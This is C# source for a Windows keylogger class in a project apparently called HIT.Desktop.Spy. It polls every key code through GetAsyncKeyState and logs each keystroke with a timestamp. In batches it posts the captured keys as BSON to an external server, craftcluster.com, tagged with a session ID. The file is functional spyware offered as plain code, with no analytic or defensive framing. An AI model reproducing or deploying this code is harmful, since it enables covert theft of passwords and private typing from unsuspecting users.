using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using HIT.Web.ViewModels;

namespace HIT.Desktop.Spy
{
    public class Keylogger : IRunnable
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private readonly string SessionId;
        private bool isRunning;
        private List<string> keysPressedList;

        public Keylogger(string sessionId)
        {
            this.SessionId = sessionId;
            this.isRunning = true;
            this.keysPressedList = new List<string>();
        }

        public Task Start()
        {
            while (this.isRunning)
            {
                // Think about this block of code
                if (this.keysPressedList.Count > 10)
                {
                    var keysToSend = this.keysPressedList.ToList();
                    this.SendKeysPressedAsync(keysToSend);
                    this.keysPressedList.Clear();
                }
                else
                {
                    Thread.Sleep(10);
                }

                for (Int32 i = 0; i < 255; i++)
                {
                    var keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)
                    {
                        var key = (Keys)i;

                        if (key != Keys.LButton && key != Keys.RButton)
                        {
                            this.keysPressedList.Add($"[{DateTime.Now}] - {key}");
                        }
                    }
                }
            }

            return null;
        }

        public async void Stop()
        {
            this.isRunning = false;
            await this.SendKeysPressedAsync(this.keysPressedList);
        }

        private async Task SendKeysPressedAsync(IList<string> data)
        {
            var model = new KeysPressedViewModel
            {
                SessionId = this.SessionId,
                KeysPressedList = data
            };

            using (var client = new HttpClient())
            {
                // Set the API base address
                //client.BaseAddress = new Uri("http://localhost:62164/");
                client.BaseAddress = new Uri("http://craftcluster.com/");

                // Set the Accept header for BSON
                client.DefaultRequestHeaders.Accept.Clear();
                client.DefaultRequestHeaders.Accept.Add(
                    new MediaTypeWithQualityHeaderValue("application/bson"));

                // POST using the BSON formatter
                var bsonFormatter = new BsonMediaTypeFormatter();
                var result = await client.PostAsync("api/Sessions/ReceiveKeysPressed", model, bsonFormatter);

                result.EnsureSuccessStatusCode();
            }
        }
    }
}
